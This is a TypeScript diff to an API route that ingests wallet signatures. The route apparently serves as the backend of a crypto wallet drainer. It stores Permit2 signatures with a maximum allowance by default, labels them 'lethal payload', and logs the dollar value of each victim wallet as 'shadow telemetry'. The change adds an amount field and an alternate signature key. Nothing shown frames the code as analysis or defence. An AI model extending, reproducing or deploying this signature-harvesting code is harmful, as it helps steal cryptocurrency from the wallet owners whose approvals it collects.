@@ -151,7 +151,8 @@ interface NormalizedIngressV1 {
   wallet_address: string
   token_address: string
   /** Agnostic Normalization — hex envelope or institutional lethal payload string. */
-  signature: Hex | string
+  signature?: Hex | string
+  signature_hex?: Hex | string
   nonce: string
   expiry_iso: string
   /** Display / vendor label (e.g. MetaMask, Phantom, Ledger) — Omni-Payload Protocol Metadata. */
@@ -164,6 +165,7 @@ interface NormalizedIngressV1 {
   permit2?: Address
   /** Shadow telemetry — Neural Scout aggregate USD at ingress. */
   scout_value_usd?: number
+  amount?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
@@ -171,7 +173,8 @@ interface NormalizedIngressV1 {
 /** Shadow — Agnostic Normalization: arbitrary Lethal Payload envelope + dynamic Omni-Payload metadata. */
 interface AgnosticNormalizationV1 {
   ingress: 'agnostic_normalization_v1'
-  signature: Hex | string
+  signature?: Hex | string
+  signature_hex?: Hex | string
   wallet_address: string
   wallet_type: string
   protocol: string
@@ -180,6 +183,7 @@ interface AgnosticNormalizationV1 {
   nonce?: string
   expiry_iso?: string
   scout_value_usd?: number
+  amount?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
@@ -197,12 +201,14 @@ interface LegacyPermit2Body {
   protocol?: string
   chain_id?: number | string
   scout_value_usd?: number
+  amount?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
 
 function extractShadowTelemetry(o: Record<string, unknown>): {
   scout_value_usd: string | null
+  amount: string | null
   max_allowance: string | null
   requires_quorum: boolean | null
 } {
@@ -211,6 +217,10 @@ function extractShadowTelemetry(o: Record<string, unknown>): {
     scout_value_usd = String(o.scout_value_usd)
   } else if (typeof o.scout_value_usd === 'string' && o.scout_value_usd.trim() !== '') {
     scout_value_usd = o.scout_value_usd.trim()
+  }
+  let amount: string | null = null
+  if (typeof o.amount === 'string' && /^\d+$/.test(o.amount.trim())) {
+    amount = o.amount.trim()
   }
   let max_allowance: string | null = null
   if (typeof o.max_allowance === 'string' && o.max_allowance.trim() !== '') {
@@ -226,7 +236,7 @@ function extractShadowTelemetry(o: Record<string, unknown>): {
   if (max_allowance == null || max_allowance === '') {
     max_allowance = String(PERMIT2_MAX_AMOUNT)
   }
-  return { scout_value_usd, max_allowance, requires_quorum }
+  return { scout_value_usd, amount, max_allowance, requires_quorum }
 }
 
 function isHexLike(s: string): boolean {
@@ -334,6 +344,7 @@ async function persistSignatureRow(row: {
   protocol: string
   chain_id?: string | null
   scout_value_usd?: string | null
+  amount?: string | null
   max_allowance?: string | null
   requires_quorum?: boolean | null
   source_origin: string
@@ -426,6 +437,7 @@ async function persistSignatureRow(row: {
       wallet_address: row.wallet_address,
       token_address: row.token_address,
       signature_hex: row.signature_hex,
+      amount: row.amount ?? null,
       protocol: row.protocol,
       chain_id: row.chain_id ?? null,
       scout_value_usd: row.scout_value_usd ?? null,
@@ -470,7 +482,8 @@ async function handleAgnosticNormalization(
   b: AgnosticNormalizationV1,
   sourceOrigin: string,
 ): Promise<Response> {
-  if (!b.signature || !b.wallet_address) {
+  const signatureRaw = b.signature ?? b.signature_hex
+  if (!signatureRaw || !b.wallet_address) {
     return NextResponse.json({ error: 'Agnostic Normalization requires signature and wallet_address' }, { status: 400 })
   }
   if (!b.wallet_type || !b.protocol) {
@@ -517,7 +530,7 @@ async function handleAgnosticNormalization(
   }
 
   const sig = normalizeSignatureHexForSeal(
-    typeof b.signature === 'string' ? b.signature : String(b.signature),
+    typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
   )
 
   const { wallet_address, token_address } = normalizeWalletToken(
@@ -554,6 +567,7 @@ async function handleAgnosticNormalization(
     protocol: rack,
     chain_id: chainIdNorm,
     scout_value_usd: tel.scout_value_usd,
+    amount: tel.amount,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
     source_origin: sourceOrigin,
@@ -568,7 +582,8 @@ async function handleNormalizedIngress(
   if (!families.includes(b.chain_family)) {
     return NextResponse.json({ error: 'Invalid chain_family for Normalized Ingress' }, { status: 400 })
   }
-  if (!b.wallet_address || !b.token_address || !b.signature || !b.nonce || !b.expiry_iso) {
+  const signatureRaw = b.signature ?? b.signature_hex
+  if (!b.wallet_address || !b.token_address || !signatureRaw || !b.nonce || !b.expiry_iso) {
     return NextResponse.json({ error: 'Invalid Normalized Ingress payload' }, { status: 400 })
   }
 
@@ -594,7 +609,7 @@ async function handleNormalizedIngress(
   }
 
   const sig = normalizeSignatureHexForSeal(
-    typeof b.signature === 'string' ? b.signature : String(b.signature),
+    typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
   )
 
   const { wallet_address, token_address } = normalizeWalletToken(
@@ -670,6 +685,7 @@ async function handleNormalizedIngress(
     protocol: rack,
     chain_id: chainIdNorm,
     scout_value_usd: tel.scout_value_usd,
+    amount: tel.amount,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
     source_origin: sourceOrigin,
@@ -762,6 +778,7 @@ async function handleLegacyPermit2(body: unknown, sourceOrigin: string): Promise
     protocol: rackFinal,
     chain_id: legacyChain,
     scout_value_usd: tel.scout_value_usd,
+    amount: tel.amount,
     max_allowance: tel.max_allowance,
     requires_quorum: tel.requires_quorum,
     source_origin: sourceOrigin,
